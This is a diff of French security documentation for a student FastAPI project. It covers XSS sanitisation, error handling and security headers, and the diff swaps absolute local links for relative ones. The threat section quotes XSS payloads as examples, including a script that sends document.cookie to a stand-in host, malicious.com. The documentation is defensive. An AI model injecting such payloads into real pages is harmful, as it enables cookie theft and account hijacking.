@@ -71,17 +71,17 @@ flowchart TD
 ### 3.2 Protection contre les Injections XSS (Cross-Site Scripting)
 * **Menace :** Soumission d'une description d'incident contenant `<script>fetch('http://malicious.com/?stolen=' + document.cookie)</script>` ou `<img src=x onerror=malicious()>`.
 * **Remédiation Hexagonale :**
-  * Création du composant [`InputSanitizer`](file:///c:/Users/hugoc/Ynov/Year3/ArchitectureHexagonale/festiplan/festiplan/app/adapters/primary/security/sanitizer.py).
-  * Intégration via des `field_validator` Pydantic sur les schémas d'entrée ([`app/schemas.py`](file:///c:/Users/hugoc/Ynov/Year3/ArchitectureHexagonale/festiplan/festiplan/app/schemas.py)).
+  * Création du composant [`InputSanitizer`](../app/adapters/primary/security/sanitizer.py).
+  * Intégration via des `field_validator` Pydantic sur les schémas d'entrée ([`app/schemas.py`](../app/schemas.py)).
   * Les balises `<script>` sont automatiquement éradiquées et les caractères spéciaux (`<`, `>`, `"`, `'`, `&`) sont convertis en entités HTML inoffensives (`&lt;`, `&gt;`).
 * **Preuve par les tests :** L'enregistrement d'une description avec payload malveillant conserve le texte légitime mais neutralise toute balise exécutable.
 
 ---
 
 ### 3.3 Prévention des Fuites d'Informations (OWASP A05 — Information Disclosure)
-* **Menace :** Lors d'une panne imprévue (panne SQLite, erreur réseau, bug inattendu), FastAPI et Starlette peuvent renvoyer la stack trace brute au client HTTP, révélant les chemins de disques locaux (`C:\Users\hugoc\...`), les noms de tables et le schéma interne.
+* **Menace :** Lors d'une panne imprévue (panne SQLite, erreur réseau, bug inattendu), FastAPI et Starlette peuvent renvoyer la stack trace brute au client HTTP, révélant les chemins de disques locaux (`C:\Users\...`), les noms de tables et le schéma interne.
 * **Remédiation Hexagonale :**
-  * Création du gestionnaire [`global_security_exception_handler`](file:///c:/Users/hugoc/Ynov/Year3/ArchitectureHexagonale/festiplan/festiplan/app/adapters/primary/security/error_handler.py).
+  * Création du gestionnaire [`global_security_exception_handler`](../app/adapters/primary/security/error_handler.py).
   * Les erreurs HTTP prévues (400, 404, 422) sont préservées pour les retours métier.
   * Toute exception inattendue est captée, logguée de manière confidentielle côté serveur avec son contexte complet, et le client reçoit une réponse générique **HTTP 500** ne contenant aucun détail sensible.
 * **Preuve par les tests :** Un crash serveur provoquant une fuite d'informations simulée renvoie une réponse JSON 500 anonymisée sans aucune trace de `C:\Users` ou de structure de base.
@@ -91,7 +91,7 @@ flowchart TD
 ### 3.4 En-têtes HTTP de Sécurité (OWASP Security Headers)
 * **Menace :** Clickjacking, écoute de trafic et attaques MIME Sniffing.
 * **Remédiation Hexagonale :**
-  * Le middleware [`SecurityHeadersMiddleware`](file:///c:/Users/hugoc/Ynov/Year3/ArchitectureHexagonale/festiplan/festiplan/app/adapters/primary/security/security_headers.py) injecte sur **toutes les réponses HTTP** :
+  * Le middleware [`SecurityHeadersMiddleware`](../app/adapters/primary/security/security_headers.py) injecte sur **toutes les réponses HTTP** :
     * `X-Content-Type-Options: nosniff`
     * `X-Frame-Options: DENY`
     * `X-XSS-Protection: 1; mode=block`
@@ -112,7 +112,7 @@ flowchart TD
 
 ## 4. Bilan de la Suite de Tests de Sécurité
 
-La suite dédiée [`tests/security/test_security_hardening.py`](file:///c:/Users/hugoc/Ynov/Year3/ArchitectureHexagonale/festiplan/festiplan/tests/security/test_security_hardening.py) comprend **10 tests automatisés** :
+La suite dédiée [`tests/security/test_security_hardening.py`](../tests/security/test_security_hardening.py) comprend **10 tests automatisés** :
 
 | # | Test | Objectif de sécurité | Résultat |
 | :---: | :--- | :--- | :---: |
